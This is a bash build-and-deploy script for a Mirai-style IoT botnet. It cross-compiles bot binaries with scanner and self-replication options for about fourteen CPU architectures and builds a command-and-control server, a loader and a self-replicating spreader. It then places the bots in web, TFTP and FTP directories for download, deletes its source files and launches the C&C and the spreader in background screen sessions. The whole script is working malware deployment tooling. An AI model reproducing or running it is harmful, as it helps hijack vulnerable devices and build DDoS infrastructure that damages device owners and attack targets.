#!/bin/bash
# gcc -std=c99 bot/*.c -DDEBUG -static -DIOCTL -DSCANNER -g -o dbg
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/arc/bin



export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; 
go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords


compile_bot() {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

compile_arm7() {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

arc_compile() {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" -std=c99 bot/*.c -s -o release/"$2"
}


mkdir ~/release 
go build -o server cnc/*

gcc -static -O3 -lpthread -pthread ~/loader/*.c -o ~/loader/load
go build -o /root/loader/selfreper /root/selfreper.go

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.arm7
x86_64-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.x86
i586-gcc -Os -D BOT_ARCH=\"i586\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.i586
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mipsel\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.mipsel
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.sh4
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.m68k
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.spc
i686-gcc -Os -D BOT_ARCH=\"i686\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.i686
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.ppc
arc-linux-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/dlr/release/dlr.arc


armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.arm7
x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.x86
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.i586
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.mipsel
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.sh4
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.m68k
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.spc
i686-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.i686
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.ppc
arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arc


mv ~/loader/dlr/release/dlr* ~/loader/dlr/
compile_bot i586 bot.i586 "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot i686 bot.i686 "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot armv4l bot.arm "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot armv5l bot.arm5 "-static -DIOCTL -DSCANNER -DSELFREP"
arc_compile arc bot.arc "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot armv6l bot.arm6 "-static -DIOCTL -DSCANNER -DSELFREP"
compile_arm7 armv7l bot.arm7 "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot x86_64 bot.x86 "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot mips bot.mips "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot mipsel bot.mipsel "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot sh4 bot.sh4 "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot m68k bot.m68k "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot sparc bot.spc "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot powerpc bot.ppc "-static -DIOCTL -DSCANNER -DSELFREP"

rm -rf /var/www/html
rm -rf /var/lib/tftpboot/
rm -rf /var/ftp/
mkdir /var/lib/tftpboot/
mkdir /var/ftp
mkdir /var/www/html
cp release/bot.* /var/www/html/
cp release/bot.* /var/lib/tftpboot/

rm -rf ~/release ~/cnc ~/selfreper.go ~/*.sh ~/bot ~/Projects
rm -rf ~/loader/headers ~/loader/*.c ~/loader/dlr/*.c ~/loader/release
screen -dmS server ./server
cd ~/loader/
echo "./selfreper | ./load" >> .loader.sh
screen -dmS selfrep sh .loader.sh
cd ~/
python hmu\ on\ discord\ for\ any\ question.py